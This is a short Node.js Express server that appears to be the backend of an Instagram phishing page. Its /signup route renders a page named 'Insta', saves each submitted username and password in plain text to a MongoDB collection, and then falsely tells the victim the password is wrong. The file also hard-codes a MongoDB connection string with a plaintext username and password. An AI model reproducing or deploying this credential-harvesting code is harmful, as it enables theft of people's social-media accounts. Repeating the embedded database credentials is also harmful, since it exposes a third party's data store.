const ex = require('express');
const app = ex();
const mongoose = require('mongoose');
const bodyparser = require('body-parser');
const path = require('path');
const PORT = 3300;
// connection 
mongoose.connect('mongodb+srv://kushpandit68775:kush68775@instafirst.bz81iux.mongodb.net/').then(() => console.log('mongoose connected')).catch( err => console.log('err mongoose' , err));
//Usermodel
let Usermodel = new mongoose.Schema({
  username: {
    type: String,
    required: true
  },
  password: {
    type: String,
    required: true
  }
});
  const User = mongoose.model('Instadata', Usermodel);
// middleware
app.use(bodyparser.urlencoded({ extended: true }));
app.use(ex.urlencoded({ extended: true }));
 // view engine
app.set('view engine' , 'ejs');
app.set('views', path.resolve('./'));
// routv,es
app.get('/signup' ,(req , res) => {
  res.render('Insta');
});
app.post('/signup', async (req, res) => {
  let {username , password} = await req.body;
   await User.create({
    username,
    password
  });
  res.send('Password is wrong, go Instagram app ');
});
 // listeing
 app.listen(PORT , () => console.log('server started'));